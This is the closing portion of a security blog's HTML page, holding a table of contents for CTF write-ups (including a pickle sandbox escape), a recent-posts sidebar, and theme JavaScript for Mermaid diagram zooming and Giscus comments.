class="toc-number">2.2.</span> <span class="toc-text">2. The dead ends</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-The-breakthrough"><span class="toc-number">2.3.</span> <span class="toc-text">3. The breakthrough</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Turning-it-into-a-boolean-oracle"><span class="toc-number">2.4.</span> <span class="toc-text">4. Turning it into a boolean oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-oracle"><span class="toc-number">2.4.1.</span> <span class="toc-text">The oracle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Extracting-data"><span class="toc-number">2.5.</span> <span class="toc-text">5. Extracting data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-The-final-Python-script"><span class="toc-number">2.6.</span> <span class="toc-text">6. The final Python script</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-it-works"><span class="toc-number">2.6.1.</span> <span class="toc-text">How it works</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Summary-of-the-exploit-chain"><span class="toc-number">2.7.</span> <span class="toc-text">7. Summary of the exploit chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-Key-takeaways"><span class="toc-number">2.8.</span> <span class="toc-text">8. Key takeaways</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Challenge-2-Time-Capsule-Pickle-Sandbox-Escape"><span class="toc-number">3.</span> <span class="toc-text">Challenge 2: Time Capsule (Pickle Sandbox Escape)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-summary"><span class="toc-number">3.1.</span> <span class="toc-text">Challenge summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-statement"><span class="toc-number">3.2.</span> <span class="toc-text">Challenge statement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-three-defenses"><span class="toc-number">3.3.</span> <span class="toc-text">The three defenses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-we-got-there"><span class="toc-number">3.4.</span> <span class="toc-text">How we got there</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Final-exploit-chain"><span class="toc-number">3.5.</span> <span class="toc-text">Final exploit chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Proof-of-concept"><span class="toc-number">3.6.</span> <span class="toc-text">Proof of concept</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Final-payload"><span class="toc-number">3.7.</span> <span class="toc-text">Final payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Key-techniques"><span class="toc-number">3.8.</span> <span class="toc-text">Key techniques</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Closing-Thoughts"><span class="toc-number">3.9.</span> <span class="toc-text">Closing Thoughts</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/09/16/PwnSec-CTF-2026/" title="PwnSec CTF 2026"><img src="/img/pwnsec-cover.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="PwnSec CTF 2026"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/09/16/PwnSec-CTF-2026/" title="PwnSec CTF 2026">PwnSec CTF 2026</a><time datetime="2026-09-16T16:00:00.000Z" title="Created 2026-09-16 17:00:00">2026-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/29/Command-Injection/" title="OS Command Injection"><img src="/img/command-injection-cover.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="OS Command Injection"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/08/29/Command-Injection/" title="OS Command Injection">OS Command Injection</a><time datetime="2026-08-29T11:00:00.000Z" title="Created 2026-08-29 12:00:00">2026-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/03/SOC-Home-Lab-Project/" title="SOC Home Lab Project"><img src="/img/soc-cover-wazuh.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="SOC Home Lab Project"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/08/03/SOC-Home-Lab-Project/" title="SOC Home Lab Project">SOC Home Lab Project</a><time datetime="2026-08-03T16:20:00.000Z" title="Created 2026-08-03 17:20:00">2026-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/07/21/CSRF/" title="CSRF (Cross-Site Request Forgery)"><img src="/img/csrf-cover.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="CSRF (Cross-Site Request Forgery)"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/07/21/CSRF/" title="CSRF (Cross-Site Request Forgery)">CSRF (Cross-Site Request Forgery)</a><time datetime="2026-07-21T20:00:00.000Z" title="Created 2026-07-21 21:00:00">2026-07-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/07/11/CCTV/" title="CCTV"><img src="/img/cctv-cover.png" onerror="this.onerror=null;this.src='/img/banner.png'" alt="CCTV"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/07/11/CCTV/" title="CCTV">CCTV</a><time datetime="2026-07-11T16:30:00.000Z" title="Created 2026-07-11 17:30:00">2026-07-11</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Youssef Kessentini</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5-b1</a></span></div><div class="footer_custom_text"><span>root@reversekoatshell:~#&nbsp;</span><span style="color:#9fef00">_</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5-b1"></script><script src="/js/main.js?v=5.5.5-b1"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const parseViewBox = viewBox => {
+    if (!viewBox) return null
+    const parts = viewBox.trim().split(/[\s,]+/).map(n => Number(n))
+    if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return null
+    return parts
+  }
+
+  const getSvgViewBox = svg => {
+    const attr = parseViewBox(svg.getAttribute('viewBox'))
+    if (attr) return attr
+
+    // Fallback: use bbox to build a viewBox
+    try {
+      const bbox = svg.getBBox()
+      if (bbox && bbox.width && bbox.height) return [bbox.x, bbox.y, bbox.width, bbox.height]
+    } catch (e) {
+      // getBBox may fail on some edge cases; ignore
+    }
+
+    const w = Number(svg.getAttribute('width')) || 0
+    const h = Number(svg.getAttribute('height')) || 0
+    if (w > 0 && h > 0) return [0, 0, w, h]
+    return [0, 0, 100, 100]
+  }
+
+  const setSvgViewBox = (svg, vb) => {
+    svg.setAttribute('viewBox', `${vb[0]} ${vb[1]} ${vb[2]} ${vb[3]}`)
+  }
+
+  const clamp = (v, min, max) => Math.max(min, Math.min(max, v))
+
+  const openSvgInNewTab = ({ source, initViewBox }) => {
+    const getClonedSvg = () => {
+      if (typeof source === 'string') {
+        const template = document.createElement('template')
+        template.innerHTML = source.trim()
+        const svg = template.content.querySelector('svg')
+        return svg ? svg.cloneNode(true) : null
+      }
+      if (source && typeof source.cloneNode === 'function') {
+        return source.cloneNode(true)
+      }
+      return null
+    }
+
+    const clone = getClonedSvg()
+    if (!clone) return
+    if (initViewBox && initViewBox.length === 4) {
+      clone.setAttribute('viewBox', initViewBox.join(' '))
+    }
+    if (!clone.getAttribute('xmlns')) clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg')
+    if (!clone.getAttribute('xmlns:xlink') && clone.outerHTML.includes('xlink:')) {
+      clone.setAttribute('xmlns:xlink', 'http://www.w3.org/1999/xlink')
+    }
+    // inject background to match current theme
+    const isDark = document.documentElement.getAttribute('data-theme') === 'dark'
+    const bg = getComputedStyle(document.body).backgroundColor || (isDark ? '#1e1e1e' : '#ffffff')
+    if (!clone.style.background) clone.style.background = bg
+
+    const serializer = new XMLSerializer()
+    const svgSource = serializer.serializeToString(clone)
+    const htmlSource = `<!doctype html><html><head><meta charset="utf-8" />
+      <style>
+        html, body { width: 100%; height: 100%; margin: 0; display: flex; align-items: center; justify-content: center; background: ${bg}; }
+        svg { max-width: 100%; max-height: 100%; height: auto; width: auto; }
+      </style>
+      </head><body>${svgSource}</body></html>`
+    const blob = new Blob([htmlSource], { type: 'text/html;charset=utf-8' })
+    const url = URL.createObjectURL(blob)
+    window.open(url, '_blank', 'noopener')
+    setTimeout(() => URL.revokeObjectURL(url), 30000)
+  }
+
+  const attachMermaidViewerButton = wrap => {
+    let btn = wrap.querySelector('.mermaid-open-btn')
+    if (!btn) {
+      btn = document.createElement('button')
+      btn.type = 'button'
+      btn.className = 'mermaid-open-btn'
+      wrap.appendChild(btn)
+    }
+
+    btn.innerHTML = '<i class="fa fa-search fa-fw" aria-hidden="true"></i>'
+
+    if (!btn.__mermaidViewerBound) {
+      btn.addEventListener('click', e => {
+        e.preventDefault()
+        e.stopPropagation()
+        const svg = wrap.__mermaidOriginalSvg || wrap.querySelector('svg')
+        if (!svg) return
+        const initViewBox = wrap.__mermaidInitViewBox
+        if (typeof svg === 'string') {
+          openSvgInNewTab({ source: svg, initViewBox })
+          return
+        }
+        openSvgInNewTab({ source: svg, initViewBox })
+      })
+      btn.__mermaidViewerBound = true
+    }
+  }
+
+  // Zoom around a point (px, py) in the SVG viewport (in viewBox coordinates)
+  const zoomAtPoint = (vb, factor, px, py) => {
+    const w = vb[2] * factor
+    const h = vb[3] * factor
+    const nx = px - (px - vb[0]) * factor
+    const ny = py - (py - vb[1]) * factor
+    return [nx, ny, w, h]
+  }
+
+  const initMermaidGestures = wrap => {
+    const svg = wrap.querySelector('svg')
+    if (!svg) return
+
+    // Ensure viewBox exists so gestures always work
+    const initVb = getSvgViewBox(svg)
+    wrap.__mermaidInitViewBox = initVb
+    wrap.__mermaidCurViewBox = initVb.slice()
+    setSvgViewBox(svg, initVb)
+
+    // Avoid binding multiple times on themeChange/pjax
+    if (wrap.__mermaidGestureBound) return
+    wrap.__mermaidGestureBound = true
+
+    // Helper: map client (viewport) coordinate -> viewBox coordinate
+    const clientToViewBox = (clientX, clientY) => {
+      const rect = svg.getBoundingClientRect()
+      const vb = wrap.__mermaidCurViewBox || getSvgViewBox(svg)
+      const x = vb[0] + (clientX - rect.left) * (vb[2] / rect.width)
+      const y = vb[1] + (clientY - rect.top) * (vb[3] / rect.height)
+      return { x, y, rect, vb }
+    }
+
+    const state = {
+      pointers: new Map(),
+      startVb: null,
+      startDist: 0,
+      startCenter: null
+    }
+
+    const clampVb = vb => {
+      const init = wrap.__mermaidInitViewBox || vb
+      const minW = init[2] * 0.1
+      const maxW = init[2] * 10
+      const minH = init[3] * 0.1
+      const maxH = init[3] * 10
+      vb[2] = clamp(vb[2], minW, maxW)
+      vb[3] = clamp(vb[3], minH, maxH)
+      return vb
+    }
+
+    const setCurVb = vb => {
+      vb = clampVb(vb)
+      wrap.__mermaidCurViewBox = vb
+      setSvgViewBox(svg, vb)
+    }
+
+    const onPointerDown = e => {
+      // Allow only primary button for mouse
+      if (e.pointerType === 'mouse' && e.button !== 0) return
+      svg.setPointerCapture(e.pointerId)
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      if (state.pointers.size === 1) {
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      } else if (state.pointers.size === 2) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        state.startDist = Math.hypot(dx, dy)
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        state.startCenter = { x: (pts[0].x + pts[1].x) / 2, y: (pts[0].y + pts[1].y) / 2 }
+      }
+    }
+
+    const onPointerMove = e => {
+      if (!state.pointers.has(e.pointerId)) return
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      // Pan with 1 pointer
+      if (state.pointers.size === 1 && state.startVb) {
+        const p = [...state.pointers.values()][0]
+        const prev = { x: e.clientX - e.movementX, y: e.clientY - e.movementY }
+        // movementX/Y unreliable on touch, compute from stored last position
+        const last = wrap.__mermaidLastSinglePointer || p
+        const dxClient = p.x - last.x
+        const dyClient = p.y - last.y
+        wrap.__mermaidLastSinglePointer = p
+
+        const { rect } = clientToViewBox(p.x, p.y)
+        const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        const dx = dxClient * (vb[2] / rect.width)
+        const dy = dyClient * (vb[3] / rect.height)
+        setCurVb([vb[0] - dx, vb[1] - dy, vb[2], vb[3]])
+        return
+      }
+
+      // Pinch zoom with 2 pointers
+      if (state.pointers.size === 2 && state.startVb && state.startDist > 0) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        const dist = Math.hypot(dx, dy)
+        if (!dist) return
+        const factor = state.startDist / dist // dist bigger => zoom in (viewBox smaller)
+
+        const cx = (pts[0].x + pts[1].x) / 2
+        const cy = (pts[0].y + pts[1].y) / 2
+        const centerClient = { x: cx, y: cy }
+
+        const pxy = clientToViewBox(centerClient.x, centerClient.y)
+        const cpx = pxy.x
+        const cpy = pxy.y
+
+        const vb = zoomAtPoint(state.startVb, factor, cpx, cpy)
+        setCurVb(vb)
+      }
+    }
+
+    const onPointerUpOrCancel = e => {
+      state.pointers.delete(e.pointerId)
+      if (state.pointers.size === 0) {
+        state.startVb = null
+        state.startDist = 0
+        state.startCenter = null
+        wrap.__mermaidLastSinglePointer = null
+      } else if (state.pointers.size === 1) {
+        // reset single pointer baseline to avoid jump
+        wrap.__mermaidLastSinglePointer = [...state.pointers.values()][0]
+      }
+    }
+
+    // Wheel zoom (mouse/trackpad)
+    const onWheel = e => {
+      // ctrlKey on mac trackpad pinch; we treat both as zoom
+      e.preventDefault()
+      const delta = e.deltaY
+      const zoomFactor = delta > 0 ? 1.1 : 0.9
+      const { x, y } = clientToViewBox(e.clientX, e.clientY)
+      const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      setCurVb(zoomAtPoint(vb, zoomFactor, x, y))
+    }
+
+    const onDblClick = () => {
+      const init = wrap.__mermaidInitViewBox
+      if (!init) return
+      wrap.__mermaidCurViewBox = init.slice()
+      setSvgViewBox(svg, init)
+    }
+
+    svg.addEventListener('pointerdown', onPointerDown)
+    svg.addEventListener('pointermove', onPointerMove)
+    svg.addEventListener('pointerup', onPointerUpOrCancel)
+    svg.addEventListener('pointercancel', onPointerUpOrCancel)
+    svg.addEventListener('wheel', onWheel, { passive: false })
+    svg.addEventListener('dblclick', onDblClick)
+  }
+
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+
+      // Clear old render (themeChange/pjax will rerun)
+      const oldSvg = item.querySelector('svg')
+      if (oldSvg) oldSvg.remove()
+      item.__mermaidGestureBound = false
+
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+        if (true) initMermaidGestures(item)
+        item.__mermaidOriginalSvg = svg
+        if (true) attachMermaidViewerButton(item)
+      }
+
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': '0xkoat/reverse-koat-shell',
+      'data-repo-id': 'R_kgDOSzIULQ',
+      'data-category-id': 'DIC_kwDOSzIULc4C--IV',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !true) {
+    if (true) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script id="canvas_nest" defer="defer" color="0,255,0" opacity="0.15" zIndex="-1" count="80" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search writeups, machines, flags..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5-b1"></script></div></div></body></html>
